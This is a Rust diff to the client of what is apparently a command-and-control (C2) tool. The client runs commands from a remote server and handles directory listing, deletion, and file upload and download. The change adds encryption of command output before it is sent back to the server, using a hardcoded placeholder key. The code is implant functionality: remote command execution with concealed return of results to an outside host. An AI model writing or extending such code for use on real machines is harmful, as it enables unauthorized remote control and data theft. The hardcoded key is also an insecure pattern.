@@ -5,19 +5,16 @@ use std::path::PathBuf;
 use tokio::process::Command;
 
 use crate::file_manager::ClientFileManager;
-use crate::shell; // Import the new shell module
+use crate::shell;
+use common::crypto::Cipher;
 use common::error::{C2Error, C2Result};
 use common::message::{
-    CommandRequest,
-    CommandResponse,
-    DeletePathResponse,
-    FileOperationCommand,
-    ListDirRequest,
-    ListDirResponse,
-    Message,
-    MessageType,
+    CommandRequest, CommandResponse, DeletePathResponse, EncryptedCommandResponse,
+    FileOperationCommand, ListDirRequest, ListDirResponse, Message, MessageType,
 };
 
+/// Executes a command on the client.
+/// Handles both regular commands and file operations like listing directories, deleting paths, downloading files, and uploading files.
 pub async fn execute_command(
     http_client: &Client,
     server_url: &str,
@@ -272,12 +269,37 @@ pub async fn execute_command(
     Ok(())
 }
 
+/// Sends the command execution result back to the server.
+/// Encrypts sensitive data before sending.
 async fn send_command_result(
     http_client: &Client,
     server_url: &str,
     result: CommandResponse,
 ) -> C2Result<()> {
-    let payload = serde_json::to_vec(&result)?;
+    // Create encryption key (should be read from config)
+    let key = b"your-32-byte-secret-key-here!!!!"; // 32 bytes
+    let cipher = Cipher::new(key);
+
+    // Encrypt the sensitive data (stdout, stderr, command)
+    let sensitive_data = serde_json::json!({
+        "command": result.command,
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "exit_code": result.exit_code
+    });
+
+    let encrypted_data = cipher
+        .encrypt(sensitive_data.to_string().as_bytes())
+        .map_err(|e| C2Error::Other(format!("Encryption failed: {}", e)))?;
+
+    // Create encrypted response
+    let encrypted_response = EncryptedCommandResponse {
+        client_id: result.client_id,
+        encrypted_data,
+        executed_at: result.executed_at,
+    };
+
+    let payload = serde_json::to_vec(&encrypted_response)?;
     let message = Message::new(MessageType::CommandResult, payload);
 
     http_client
@@ -288,6 +310,7 @@ async fn send_command_result(
     Ok(())
 }
 
+/// Sends a file operation response back to the server.
 async fn send_file_operation_response(
     http_client: &Client,
     server_url: &str,
